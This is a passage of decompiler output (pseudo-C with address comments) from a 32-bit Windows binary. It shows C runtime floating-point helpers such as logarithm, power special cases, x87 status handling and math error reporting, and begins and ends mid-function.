                    goto lab_0x4101fd;
                }
            }
        }
        // 0x4101d6
        v3 = __asm_mulsd(v31, __asm_movlpd_11(v28, 0x4330000000000000));
        v4 = -1075;
        v5 = v3;
        v6 = __asm_movapd(v5);
        v7 = __asm_unpcklpd(v5, v5);
        v8 = __asm_pextrw(__asm_psrlq(v6, 52), 0);
        v9 = __asm_movapd(g54);
        v10 = __asm_movapd(g55);
        v11 = __asm_movapd(g60);
        v12 = __asm_movapd(g56);
        v13 = __asm_movapd(g57);
        v14 = __asm_orpd(__asm_andpd(v7, v9), v11);
        v15 = __asm_pextrw(__asm_addpd(v12, v14), 0) & 2032;
        v16 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g68));
        v17 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g67));
        v18 = __asm_andpd(v13, v14);
        v19 = __asm_subpd(v14, v18);
        v20 = __asm_subpd(__asm_mulpd(v18, v16), v10);
        v21 = __asm_addsd(v17, v20);
        v22 = __asm_mulpd(v19, v16);
        v23 = __asm_movapd(v22);
        v24 = __asm_addpd(v22, v20);
        v25 = v8 & 4095;
        v26 = v25 - 1;
    }
    int32_t v39 = v25 + v4; // 0x41009e
    int128_t v40 = __asm_cvtsi2sd(v39); // 0x4100a0
    int128_t v41 = __asm_unpcklpd(v40, v40); // 0x4100a4
    int128_t v42 = __asm_movapd(g62); // 0x4100bd
    int128_t v43 = __asm_movapd(v24); // 0x4100c5
    int128_t v44 = __asm_movapd(g63); // 0x4100c9
    int128_t v45 = __asm_mulpd(v42, v24); // 0x4100d1
    int128_t v46 = __asm_mulpd(v43, v43); // 0x4100d5
    int128_t v47 = __asm_addpd(v45, v44); // 0x4100d9
    int128_t v48 = __asm_movapd(g64); // 0x4100dd
    int128_t v49 = __asm_mulsd(v46, v46); // 0x4100e5
    int128_t v50 = __asm_mulpd(v41, __asm_movapd(g58)); // 0x4100f1
    int32_t v51 = v15 == -((1024 * v39)) ? (int32_t)&g59 + 16 : (int32_t)&g59; // 0x4100f5
    int128_t v52 = __asm_addpd(__asm_addpd(v21, v50), __asm_andpd(v23, __asm_movapd(*(int128_t *)v51))); // 0x410105
    int128_t v53 = __asm_mulpd(v47, v24); // 0x410109
    int128_t v54 = __asm_mulsd(v49, v24); // 0x41010d
    int128_t v55 = __asm_addpd(v53, v48); // 0x410111
    int128_t v56 = __asm_mulpd(__asm_movapd(g65), v24); // 0x41011d
    int128_t v57 = __asm_movapd(v52); // 0x410121
    int128_t v58 = __asm_unpckhpd(v57, v57); // 0x410125
    int128_t v59 = __asm_mulpd(v55, v54); // 0x410129
    int128_t v60 = __asm_movapd(v59); // 0x410130
    int128_t v61 = __asm_addsd(__asm_addsd(__asm_unpckhpd(v60, v60), __asm_addpd(v59, v56)), v58); // 0x410140
    float64_t result; // bp-12, 0x40fff8
    __asm_movlpd((int64_t)result, __asm_addsd(v61, v52));
    return result;
  lab_0x41020a:
    // 0x41020a
    __asm_movlpd((int64_t)result, v29);
    function_410853((int64_t *)&v1, (int64_t *)&v1, (int64_t *)&result, v27);
    return result;
  lab_0x4101fd:;
    int128_t v62 = __asm_xorpd(v28, v28); // 0x4101fd
    v29 = __asm_divsd(v62, v62);
    v27 = 9;
    goto lab_0x41020a;
}

// Address range: 0x41026b - 0x4102d8
int32_t function_41026b(void) {
    // 0x41026b
    int32_t v1; // 0x41026b
    *(char *)(v1 - 144) = -2;
    int32_t v2; // 0x41026b
    if ((v2 & 0xff00) == 0) {
        // 0x41028e
        function_4103be();
        return (float32_t)function_410568();
    }
    // 0x4102b6
    if (function_410401() == 0) {
        // 0x4102d3
        return function_410623();
    }
    // 0x41028e
    function_4103be();
    return (float32_t)function_410568();
}

// Address range: 0x4102d8 - 0x4102ea
float80_t function_4102d8(void) {
    // 0x4102d8
    int32_t v1; // 0x4102d8
    *(char *)(v1 - 144) = 2;
    return INFINITY;
}

// Address range: 0x4102ea - 0x410304
float80_t function_4102ea(void) {
    // 0x4102ea
    __asm_wait();
    __asm_wait();
    return 0.693147180559945286227L * llvm_log2_f80(0.693147180559945286227L);
}

// Address range: 0x410304 - 0x410314
float80_t function_410304(void) {
    // 0x410304
    int32_t v1; // 0x410304
    *(char *)(v1 - 144) = 2;
    return -INFINITY;
}

// Address range: 0x410314 - 0x410370
int32_t function_410314(void) {
    // 0x410314
    int32_t result; // 0x410314
    return result;
}

// Address range: 0x410370 - 0x41039f
int32_t function_410370(int32_t a1) {
    // 0x410370
    __asm_wait();
    int32_t result = __asm_wait(); // 0x41037a
    int32_t v1; // 0x410370
    if ((*(char *)(v1 - 159) & 1) == 0) {
        // 0x410384
        return result;
    }
    // 0x410393
    *(char *)(v1 - 144) = 4;
    return (float32_t)function_410576();
}

// Address range: 0x41039f - 0x4103b1
float80_t function_41039f(void) {
    // 0x41039f
    int32_t v1; // 0x41039f
    *(char *)(v1 - 144) = 3;
    return INFINITY;
}

// Address range: 0x4103b1 - 0x4103be
float80_t function_4103b1(void) {
    // 0x4103b1
    return INFINITY;
}

// Address range: 0x4103be - 0x410401
float80_t function_4103be(void) {
    // 0x4103be
    __asm_wait();
    __asm_wait();
    int32_t v1; // 0x4103be
    if ((*(char *)(v1 - 159) & 65) != 0) {
        function_410370((int32_t)&g266);
    }
    // 0x4103db
    float80_t v2; // 0x4103be
    llvm_round_f80(fabsl(v2));
    __asm_wait();
    __asm_wait();
    __asm_wait();
    return llvm_exp2_f80(fabsl(0.0) - 1.0L);
}

// Address range: 0x410401 - 0x410435
int32_t function_410401(void) {
    // 0x410401
    __asm_wait();
    int32_t v1; // 0x410401
    int32_t v2 = v1 & 0x4000;
    int32_t result = 0; // 0x41040b
    if (v2 != 0) {
        // 0x41040d
        __asm_wait();
        result = v2 == 0 ? 1 : 2;
    }
    // 0x410426
    return result;
}

// Address range: 0x410435 - 0x410467
int32_t function_410435(void) {
    // 0x410435
    __asm_wait();
    int864_t v1 = __asm_fnsave(); // 0x410449
    int32_t result = function_410bfb(v1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x41044c
    __asm_frstor(v1);
    return result;
}

// Address range: 0x410470 - 0x4104d7
int32_t function_410470(void) {
    int16_t v1 = 0x133f; // 0x410474
    int32_t v2; // 0x410470
    int32_t v3; // 0x410470
    if (*(char *)(v3 + 14) == 5) {
        // 0x410476
        v1 = *(int16_t *)(v2 - 164) & -1024 | 575;
    }
    // 0x41048b
    *(int16_t *)(v2 - 162) = v1;
    float80_t v4; // 0x410470
    int32_t v5 = __asm_fxam(v4); // 0x41049d
    __asm_wait();
    *(int32_t *)(v2 - 160) = v5;
    *(char *)(v2 - 144) = 0;
    __asm_wait();
    unsigned char v6 = *(char *)(v2 - 159); // 0x4104b4
    char result = *(char *)((int32_t)(v6 / 64 & 1 | 2 * v6 & 14) + (int32_t)&g66); // 0x4104c4
    return result;
}

// Address range: 0x4104d7 - 0x410563
int32_t function_4104d7(void) {
    int16_t v1 = 0x133f; // 0x4104db
    int32_t v2; // 0x4104d7
    int32_t v3; // 0x4104d7
    if (*(char *)(v3 + 14) == 5) {
        // 0x4104dd
        v1 = *(int16_t *)(v2 - 164) & -1024 | 575;
    }
    // 0x4104f2
    *(int16_t *)(v2 - 162) = v1;
    float80_t v4; // 0x4104d7
    int32_t v5 = __asm_fxam(v4); // 0x410504
    __asm_wait();
    int32_t * v6 = (int32_t *)(v2 - 160); // 0x41050d
    *v6 = v5;
    *(char *)(v2 - 144) = 0;
    char * v7 = (char *)(v2 - 159); // 0x41051c
    unsigned char v8 = *v7; // 0x41051c
    int32_t v9 = __asm_fxam(v4); // 0x410522
    __asm_wait();
    *v6 = v9;
    unsigned char v10 = *v7; // 0x41052d
    char v11 = *(char *)((int32_t)(v10 / 64 & 1 | 2 * v10 & 14) + (int32_t)&g66); // 0x41053d
    char v12 = *(char *)((int32_t)(v8 / 64 & 1 | 2 * v8 & 14) + (int32_t)&g66); // 0x41054a
    return v12 | 4 * v11;
}

// Address range: 0x410568 - 0x41056d
float80_t function_410568(void) {
    // 0x410568
    float80_t result; // 0x410568
    return result;
}

// Address range: 0x41056d - 0x410574
int32_t function_41056d(void) {
    // 0x41056d
    int32_t result; // 0x41056d
    return result;
}

// Address range: 0x410576 - 0x41057b
float80_t function_410576(void) {
    // 0x410576
    return 0.0L;
}

// Address range: 0x41057b - 0x410588
int32_t function_41057b(void) {
    // 0x41057b
    int32_t result; // 0x41057b
    return result;
}

// Address range: 0x410588 - 0x41058f
float80_t function_410588(void) {
    // 0x410588
    return 1.0L;
}

// Address range: 0x41058f - 0x4105ba
float80_t function_41058f(void) {
    // 0x41058f
    int32_t v1; // 0x41058f
    *(char *)(v1 - 144) = 0;
    float80_t result; // 0x41058f
    if ((*(char *)(v1 - 151) & 64) == 0) {
        // 0x4105ac
        return result + 1.0L;
    }
    // 0x4105a4
    return result;
}

// Address range: 0x4105ba - 0x4105e4
float80_t function_4105ba(void) {
    // 0x4105ba
    int32_t v1; // 0x4105ba
    *(char *)(v1 - 144) = 0;
    float80_t v2; // 0x4105ba
    return 2 * v2;
}

// Address range: 0x4105e4 - 0x410623
float80_t function_4105e4(void) {
    // 0x4105e4
    int32_t v1; // 0x4105e4
    char * v2 = (char *)(v1 - 151); // 0x4105f0
    float80_t v3; // 0x4105e4
    if ((*v2 & 64) == 0 || (*v2 & 64) == 0) {
        // 0x410619
        *(char *)(v1 - 144) = 1;
        // 0x410620
        return 2 * v3;
    }
    // 0x410610
    *(char *)(v1 - 144) = 0;
    // 0x410620
    return 2 * v3;
}

// Address range: 0x410623 - 0x410640
int32_t function_410623(void) {
    // 0x410623
    int32_t v1; // 0x410623
    char * v2 = (char *)(v1 - 144); // 0x41062d
    char v3 = *v2; // 0x41062d
    if (v3 >= 0 != v3 != 0) {
        // 0x410636
        *v2 = 1;
    }
    // 0x41063d
    int32_t result; // 0x410623
    return result;
}

// Address range: 0x410640 - 0x41065d
int32_t function_410640(void) {
    // 0x410640
    int32_t result; // 0x410640
    return result;
}

// Address range: 0x41065d - 0x410664
int32_t function_41065d(void) {
    // 0x41065d
    int32_t result; // 0x41065d
    return result;
}

// Address range: 0x410670 - 0x410685
float80_t function_410670(void) {
    // 0x410670
    float80_t v1; // 0x410670
    llvm_round_f80(v1);
    float80_t v2 = llvm_exp2_f80(-1.0L) + 1.0L; // 0x41067e
    return v2 * llvm_exp2_f80(llvm_round_f80(v2));
}

// Address range: 0x410685 - 0x41069c
int32_t function_410685(int32_t a1) {
    // 0x410685
    int32_t result; // 0x410685
    return result;
}

// Address range: 0x41069c - 0x4106b5
int32_t function_41069c(void) {
    // 0x41069c
    return 0;
}

// Address range: 0x4106b5 - 0x4106f8
int32_t function_4106b5(void) {
    // 0x4106b5
    int32_t v1; // 0x4106b5
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x4106b5
    int32_t v3 = v2 & 0x7ff00000; // 0x4106b8
    return v3 == 0x7ff00000 ? v2 : v3;
}

// Address range: 0x4106f8 - 0x41070e
int32_t function_4106f8(float80_t a1) {
    int32_t v1 = (int32_t)(float32_t)a1 & 0x7ff00000; // 0x4106fc
    return v1 == 0x7ff00000 ? (int32_t)(float32_t)a1 : v1;
}

// Address range: 0x41070e - 0x41071b
int32_t function_41070e(int32_t a1) {
    // 0x41070e
    int32_t result; // 0x41070e
    return result;
}

// Address range: 0x41071b - 0x410745
int32_t function_41071b(int32_t a1) {
    // 0x41071b
    int32_t v1; // 0x41071b
    int32_t v2 = v1 & -0x10000; // 0x41071b
    int16_t v3 = a1; // 0x41071f
    if (v3 == 639) {
        // 0x410743
        return v2 | a1 & 0xffff;
    }
    uint16_t v4 = v3 & 32; // 0x410725
    if (v4 == 0) {
        // 0x410743
        return v2 | (int32_t)v4;
    }
    // 0x41072b
    int32_t v5; // 0x41071b
    uint16_t v6 = (int16_t)v5 & 32; // 0x41072e
    int32_t result = __asm_wait() & -0x10000 | (int32_t)v6; // 0x410732
    if (v6 == 0) {
        // 0x410743
        return result;
    }
    int32_t result2 = function_410817((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x410739
    return result2;
}

// Address range: 0x410745 - 0x410759
int32_t function_410745(void) {
    // 0x410745
    float80_t v1; // 0x410745
    return function_41076d(v1);
}

// Address range: 0x410759 - 0x41076d
int32_t function_410759(void) {
    // 0x410759
    int32_t v1; // 0x410759
    return v1 & 0x7ff00000;
}

// Address range: 0x41076d - 0x4107fc
int32_t function_41076d(float80_t a1) {
    // 0x41076d
    int32_t v1; // 0x41076d
    if (v1 == 0x7ff00000) {
        // 0x4107d3
        __asm_wait();
    } else {
        int32_t v2 = v1 & -0x10000; // 0x410774
        if ((int16_t)(float16_t)a1 == 639) {
            // 0x4107a8
            return v2 | (int32_t)(int16_t)(float16_t)a1;
        }
        uint16_t v3 = (int16_t)(float16_t)a1 & 32; // 0x41077e
        if (v3 != 0) {
            // 0x4107a8
            return v2 | (int32_t)v3;
        }
        // 0x410784
        int32_t v4; // 0x41076d
        uint16_t v5 = (int16_t)v4 & 32; // 0x410787
        int32_t result = __asm_wait() & -0x10000 | (int32_t)v5; // 0x41078b
        if (v5 == 0) {
            // 0x4107a8
            return result;
        }
    }
    int32_t v6; // 0x41076d
    if (v6 == 29) {
        // 0x41079e
        return function_410800((int32_t)&g266, (int32_t)&g266);
    }
    int32_t result2 = function_410817((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x410797
    return result2;
}

// Address range: 0x410800 - 0x410817
int32_t function_410800(int32_t a1, int32_t result) {
    // 0x410800
    return result;
}

// Address range: 0x410817 - 0x410853
int32_t function_410817(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a1;
    int32_t v2; // bp-36, 0x410817
    int32_t v3; // 0x410817
    int32_t v4; // 0x410817
    int32_t v5; // 0x410817
    return function_410d26(v3, &v2, &v1, v5, v4, a2, a3);
}

// Address range: 0x410853 - 0x410a6b
int32_t function_410853(int64_t * a1, int64_t * a2, int64_t * a3, int32_t a4) {
    // 0x410853
    int32_t v1; // bp-48, 0x410853
    int32_t * v2 = &v1; // 0x41086e
    if (g236 != 0) {
        int32_t v3 = g258; // bp-52, 0x410870
        DecodePointer((int32_t *)g258);
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t v5; // bp-40, 0x410853
    if (a4 > 26) {
        // 0x4109b2
        switch (a4) {
            case 27: {
                // 0x410a19
                v5 = 2;
                goto lab_0x410a20;
            }
            case 28: {
                goto lab_0x4108c7;
            }
            case 49: {
                goto lab_0x4108c7;
            }
            case 58: {
                goto lab_0x4108c7;
            }
            case 61: {
                goto lab_0x4108c7;
            }
            default: {
                int32_t v6 = a4 - 1000; // 0x4109cb
                if (v6 != 0 == (v6 != 1)) {
                    // 0x410a5b
                    return function_406b2c();
                }
                // 0x4109a8
                *a3 = *a1;
                // 0x410a5b
                return function_406b2c();
            }
        }
    } else {
        // 0x410891
        if (a4 == 26) {
            // 0x4109a8
            *a3 = 0x3ff0000000000000;
            // 0x410a5b
            return function_406b2c();
        }
        if (a4 > 14) {
            if (a4 == 15) {
                goto lab_0x410961;
            } else {
                int32_t v7 = a4 - 24; // 0x41094c
                if (v7 == 0) {
                    // 0x410a19
                    v5 = 3;
                    goto lab_0x410a20;
                } else {
                    if (v7 != 1) {
                        // 0x410a5b
                        return function_406b2c();
                    }
                    goto lab_0x410961;
                }
            }
        } else {
            if (a4 == 14) {
                // 0x410934
                v5 = 3;
                goto lab_0x410a20;
            } else {
                // 0x4108a6
                *(int32_t *)(v4 - 4) = 2;
                switch (a4) {
                    case 2: {
                        // 0x410925
                        v5 = 2;
                        goto lab_0x410a20;
                    }
                    case 3: {
                        goto lab_0x4108c7;
                    }
                    default: {
                        int32_t v8 = a4 - 8; // 0x4108b2
                        if (v8 == 0) {
                            // 0x41090d
                            v5 = 2;
                            goto lab_0x410a20;
                        } else {
                            if (v8 != 1) {
                                // 0x410a5b
                                return function_406b2c();
                            }
                            goto lab_0x4108c7;
                        }
                    }
                }
            }
        }
    }
  lab_0x4108c7:;
    int32_t v9 = (int32_t)a3; // 0x4108cc
    v5 = 1;
    int64_t v10 = *a3;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    float64_t v11 = v10; // 0x4108f7
    int32_t v12 = v9; // 0x4108f7
    if (function_406b3d() == 0) {
        // 0x4108fd
        *(int32_t *)function_40b091() = 33;
        v11 = v10;
        v12 = v9;
    }
    // 0x410a56
    *(float64_t *)v12 = v11;
    // 0x410a5b
    return function_406b2c();
  lab_0x410a20:;
    int32_t v13 = (int32_t)a3; // 0x410a25
    int64_t v14 = *a3;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    v11 = v14;
    v12 = v13;
    if (function_406b3d() == 0) {
        // 0x410a4b
        *(int32_t *)function_40b091() = 34;
        v11 = v14;
        v12 = v13;
    }
    // 0x410a56
    *(float64_t *)v12 = v11;
    // 0x410a5b
    return function_406b2c();
  lab_0x410961:
    // 0x410961
    v5 = 4;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    function_406b3d();
    // 0x410a56
    *(float64_t *)(int32_t)a3 = (float64_t)*a3;
    // 0x410a5b
    return function_406b2c();
}

// Address range: 0x410a6b - 0x410b24
int32_t function_410a6b(int32_t a1, int32_t a2) {
    int32_t v1 = function_40f978(); // 0x410a7f
    int32_t v2 = a2 & 0x7ff0; // 0x410a94
    float80_t v3 = (int64_t)a1;
    float80_t v4; // 0x410a6b
    float80_t v5; // 0x410a6b
    int32_t v6; // 0x410a6b
    if (v2 != 0x7ff0) {
        float80_t v7 = function_410e31(v3, v2); // 0x410ad7
        uint32_t v8; // 0x410a6b
        if ((llvm_ctpop_i8((char)(v8 / 256) & 68) & 1) != 0) {
            // 0x410b1e
            return function_40f978();
        }
        // 0x410b00
        v4 = v7;
        v5 = v7;
        v6 = 16;
        if ((v1 & 32) != 0) {
            // 0x410b1e
            return function_40f978();
        }
    } else {
        // 0x410aa0
        if (function_411611(v3, v2, (int32_t)&g266) < 4) {
            // 0x410b1e
            return function_40f978();
        }
        float80_t v9 = (int64_t)a1; // 0x410abb
        v4 = v9 + 1.0L;
        v5 = v9;
        v6 = 8;
    }
    int32_t result = function_410e7b(v6, 12, v5, v4, v1, (int32_t)&g266); // 0x410b16
    // 0x410b1e
    return result;
}

// Address range: 0x410b30 - 0x410b91
int32_t function_410b30(int32_t a1, int32_t a2, int32_t a3) {
    // 0x410b30
    if (a3 == 0) {
        // 0x410b8a
        return 0;
    }
    int32_t v1 = a3; // 0x410b49
    int32_t v2 = a1; // 0x410b49
    int32_t v3 = a2; // 0x410b49
    unsigned char v4 = *(char *)v2; // 0x410b4c
    char v5 = *(char *)v3; // 0x410b50
    char v6 = v5; // 0x410b52
    char v7 = v4; // 0x410b52
    bool v8; // 0x410b30
    while (v4 != 0 && v5 != 0) {
        int32_t v9 = 256 * (int32_t)v4; // 0x410b4e
        char v10 = v5 > 90 ? v5 : v5 + 32;
        int32_t v11; // 0x410b30
        char v12 = (v4 > 90 ? v9 : v9 + (v11 & 255 | 0x2000) & 0xff00) / 256;
        if (v10 != v12) {
            // 0x410b81
            v8 = v10 > v12;
            return v8 ? -1 : 1;
        }
        // 0x410b76
        v1--;
        v2++;
        v3++;
        v6 = v10;
        v7 = v12;
        if (v1 == 0) {
            // break -> 0x410b7b
            break;
        }
        v4 = *(char *)v2;
        v5 = *(char *)v3;
        v6 = v5;
        v7 = v4;
    }
    // 0x410b7b
    v8 = v7 < v6;
    if (v7 == v6) {
        // 0x410b8a
        return 0;
    }
  lab_0x410b81_2:
    // 0x410b81
    return v8 ? -1 : 1;
}

// Address range: 0x410b91 - 0x410bfb
int32_t function_410b91(float80_t a1, int32_t a2, int32_t a3) {
    // 0x410b91
    int32_t v1; // 0x410b91
    int32_t v2; // 0x410b91
    if ((function_41166f(a1, v2, (int32_t)(float32_t)(float64_t)(int64_t)v2, v2, v1) & 144) != 0) {
        // 0x410bf7
        return 0;
    }
    // 0x410bab
    function_410e31(a1, v2);
    int32_t result = 0; // 0x410bc6
    uint32_t v3; // 0x410b91
    if ((llvm_ctpop_i8((char)(v3 / 256) & 68) & 1) != 0) {
        // 0x410bc8
        function_410e31(0.5L * a1, v2);
        result = 2;
    }
    // 0x410bf7
    return result;
}

// Address range: 0x410bfb - 0x410d26
int32_t function_410bfb(int864_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x410bfb
    float80_t v1; // 0x410bfb
    uint32_t v2; // 0x410bfb
    if (a4 != 0x7ff00000) {
        if (a3 == 0 == a4 == -0x100000) {
            // 0x410c5a
            v1 = 0.0L;
            if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) == 0) {
                // 0x410c70
                v1 = (v2 & 0x4100) != 0 ? 1.0L : INFINITY;
            }
            // 0x410d20
            *(float64_t *)a5 = (float64_t)v1;
            // 0x410d22
            return 0;
        }
    } else {
        if (a3 == 0) {
            // 0x410c1a
            v1 = INFINITY;
            if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) == 0) {
                // 0x410c34
                v1 = (v2 & 0x4100) != 0 ? 1.0L : 0.0L;
            }
            // 0x410d20
            *(float64_t *)a5 = (float64_t)v1;
            // 0x410d22
            return 0;
        }
    }
    if (a2 == 0x7ff00000) {
        if ((int32_t)(float32_t)(float64_t)(int64_t)a1 != 0) {
            // 0x410d22
            return 0;
        }
        // 0x410ca0
        v1 = INFINITY;
        if ((v2 & 0x4100) != 0) {
            // 0x410cb2
            v1 = (llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) != 0 ? 0.0L : 1.0L;
        }
        // 0x410d20
        *(float64_t *)a5 = (float64_t)v1;
        // 0x410d22
        return 0;
    }
    if (a2 != -0x100000) {
        // 0x410d22
        return 0;
    }
    if ((int32_t)(float32_t)(float64_t)(int64_t)a1 != 0) {
        // 0x410d22
        return 0;
    }
    // 0x410ccf
    int32_t v3; // 0x410bfb
    int32_t v4 = function_410b91((float80_t)(float64_t)(int64_t)a3, 0x7ff00000, v3); // 0x410cd7
    if ((v2 & 0x4100) == 0) {
        // 0x410d20
        *(float64_t *)a5 = (float64_t)(v4 != 1 ? INFINITY : -INFINITY);
        // 0x410d22
        return 0;
    }
    // 0x410d01
    v1 = 1.0L;
    if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) != 0) {
        // 0x410d0a
        v1 = v4 != 1 ? 0.0L : 0.0L;
    }
    // 0x410d20
    *(float64_t *)a5 = (float64_t)v1;
    // 0x410d22
    return 0;
}

// Address range: 0x410d26 - 0x410e31
int32_t function_410d26(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = (int32_t)a3;
    int32_t v2 = (int32_t)*(int16_t *)a4; // 0x410d55
    int32_t v3 = v2; // bp-148, 0x410d58
    int32_t v4 = *a3; // 0x410d5e
    int32_t v5; // 0x410d26
    int32_t v6; // 0x410d26
    int32_t v7; // 0x410d26
    int32_t v8; // bp-160, 0x410d26
    int32_t v9; // bp-164, 0x410d26
    switch (v4) {
        case 1: {
            // 0x410d8e
            v9 = 8;
            v5 = 8;
            goto lab_0x410d90;
        }
        case 2: {
            // 0x410d8a
            v9 = 4;
            v5 = 4;
            goto lab_0x410d90;
        }
        case 3: {
            // 0x410d86
            v9 = 17;
            v5 = 17;
            goto lab_0x410d90;
        }
        case 4: {
            // 0x410d82
            v9 = 18;
            v5 = 18;
            goto lab_0x410d90;
        }
        default: {
            int32_t v10 = v4 - 5; // 0x410d74
            if (v10 == 0) {
                // 0x410d8e
                v9 = 8;
                v5 = 8;
                goto lab_0x410d90;
            } else {
                // 0x410d79
                v6 = v2;
                v7 = &v8;
                if (v10 != 3) {
                    goto lab_0x410df0;
                } else {
                    // 0x410d7e
                    v9 = 16;
                    v5 = 16;
                    goto lab_0x410d90;
                }
            }
        }
    }
  lab_0x410d90:;
    int32_t v11 = &v9;
    v9 = v2;
    int32_t v12 = v1 + 24; // 0x410d92
    int32_t * v13 = (int32_t *)(v11 - 4); // 0x410d95
    *v13 = v12;
    int32_t * v14 = (int32_t *)(v11 - 8); // 0x410d96
    *v14 = v5;
    int32_t v15; // 0x410d26
    int32_t v16 = function_410f49(v9, v8, v15, v3); // 0x410d97
    int32_t v17 = v11 + 4; // 0x410d9c
    v6 = v3;
    v7 = v17;
    if (v16 == 0) {
        // 0x410da3
        int32_t v18; // 0x410d26
        int32_t v19 = a2 == (int32_t *)29 | a2 == (int32_t *)16 | a2 == (int32_t *)22 ? v18 & -32 | 3 : v18 & -2;
        v9 = v12;
        *v13 = v1 + 8;
        *v14 = (int32_t)a2;
        *(int32_t *)(v11 - 12) = v5;
        *(int32_t *)(v11 - 16) = (int32_t)&v3;
        int32_t v20; // bp-144, 0x410d26
        *(int32_t *)(v11 - 20) = (int32_t)&v20;
        function_411129(v19, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v6 = v3;
        v7 = v17;
    }
    goto lab_0x410df0;
  lab_0x410df0:;
    int32_t * v21 = (int32_t *)(v7 - 4); // 0x410df0
    *v21 = 0xffff;
    *(int32_t *)(v7 - 8) = v6;
    function_40f978();
    if (*a3 == 8 || (char)function_40ab5b() == 0) {
        // 0x410e16
        *v21 = *a3;
        function_41143d((int32_t)&g266);
        // 0x410e1e
        return function_406b2c();
    }
    // 0x410e0b
    *v21 = v1;
    if (function_40ab88() != 0) {
        // 0x410e1e
        return function_406b2c();
    }
    // 0x410e16
    *v21 = *a3;
    function_41143d((int32_t)&g266);
    // 0x410e1e
    return function_406b2c();
}

// Address range: 0x410e31 - 0x410e47
float80_t function_410e31(float80_t a1, int32_t a2) {
    // 0x410e31
    return llvm_round_f80(a1);
}

// Address range: 0x410e47 - 0x410e7b
int32_t function_410e47(int32_t a1) {
    // 0x410e47
    if ((a1 & 32) != 0) {
        // 0x410e5b
        return 5;
    }
    // 0x410e57
    if ((a1 & 8) != 0) {
        // 0x410e5b
        return 1;
    }
    // 0x410e60
    if ((a1 & 4) != 0) {
        // 0x410e5b
        return 2;
    }
    // 0x410e68
    if ((a1 & 1) == 0) {
        // 0x410e71
        return 2 * a1 & 4;
    }
    // 0x410e5b
    return 3;
}

// Address range: 0x410e7b - 0x410f49
int32_t function_410e7b(int32_t a1, int32_t a2, float80_t a3, float80_t a4, int32_t a5, int32_t a6) {
    float64_t v1 = a4;
    int32_t v2 = a5;
    int32_t v3 = a6;
    int32_t v4; // 0x410e7b
    int32_t v5 = function_410f49(a2, (int32_t)&v2, a6, v4); // 0x410eaf
    v3 = a6;
    if (v5 == 0) {
        // 0x410ebb
        int32_t v6; // bp-144, 0x410e7b
        function_41114c(&v6, &v3, a2, (int32_t)(float32_t)a3, (int32_t *)&v1, &v2, v5);
    }
    int32_t v7 = function_410e47(a2); // 0x410ee4
    if (v7 == 0 | (char)function_40ab5b() == 0) {
        // 0x410f1e
        function_41143d(v7);
        function_40f978();
    } else {
        // 0x410ef9
        function_41146c(v7, (int32_t)(float32_t)a3, (float80_t)v1, 0.0L, (float80_t)(float64_t)(int64_t)v2, v3, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x410f36
    return function_406b2c();
}

// Address range: 0x410f49 - 0x411129
int32_t function_410f49(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x410f49
    int32_t v1; // 0x410f49
    float64_t v2; // 0x410f49
    if ((a1 & 8) == 0 || (a3 & 1) == 0) {
        if ((a1 & 4 & a3) == 0) {
            uint32_t v3; // 0x410f49
            if ((a1 & 1) == 0 || (a3 & 8) == 0) {
                // 0x411032
                v1 = a1 & 31;
                if ((a1 & 2) == 0 || (a3 & 16) == 0) {
                    goto lab_0x411106;
                } else {
                    // 0x411045
                    if ((llvm_ctpop_i8((char)(v3 / 256) & 68) & 1) != 0) {
                        // 0x4110fb
                        function_40f9a4();
                        // 0x411103
                        v1 = a1 & 29;
                        goto lab_0x411106;
                    } else {
                        float64_t * v4 = (float64_t *)a2; // 0x411051
                        float64_t v5 = *v4; // 0x411051
                        int32_t v6; // bp-8, 0x410f49
                        int32_t v7; // 0x410f49
                        int32_t v8; // 0x410f49
                        int32_t v9; // 0x410f49
                        function_41150e((float80_t)v5, a2, &v6, v7, v8, v9);
                        int32_t v10 = v6; // 0x411072
                        int32_t v11 = v10 - 1536; // 0x411078
                        v6 = v11;
                        if (v11 > -1075) {
                            int32_t v12 = (a1 & 16) != 0;
                            float64_t v13 = v5; // 0x4110b6
                            int32_t v14 = v12; // 0x4110b6
                            if (v11 <= 0xfffffc02) {
                                int32_t v15 = 515 - v10; // 0x4110ba
                                int32_t v16 = v12;
                                int32_t v17 = v16 + (int32_t)(v16 == 0 == (((int32_t)(float32_t)v5 & 1) != 0));
                                uint32_t v18 = (int32_t)(float32_t)v5 / 2; // 0x4110c8
                                int32_t v19 = v18 | -0x80000000;
                                char v20; // 0x410f49
                                int64_t v21 = (v20 & 1) == 0 ? (int64_t)v18 : (int64_t)v19;
                                int32_t v22 = (v20 & 1) == 0 ? v18 : v19;
                                v15--;
                                v20 /= 2;
                                v13 = v21;
                                v14 = v17;
                                while (v15 != 0) {
                                    // 0x4110bd
                                    v16 = v17;
                                    v17 = v16 + (int32_t)(v16 == 0 == (((int32_t)(float32_t)(float64_t)v21 & 1) != 0));
                                    v18 = v22 / 2;
                                    v19 = v18 | -0x80000000;
                                    v21 = (v20 & 1) == 0 ? (int64_t)v18 : (int64_t)v19;
                                    v22 = (v20 & 1) == 0 ? v18 : v19;
                                    v15--;
                                    v20 /= 2;
                                    v13 = v21;
                                    v14 = v17;
                                }
                            }
                            float80_t v23 = v13; // 0x4110e3
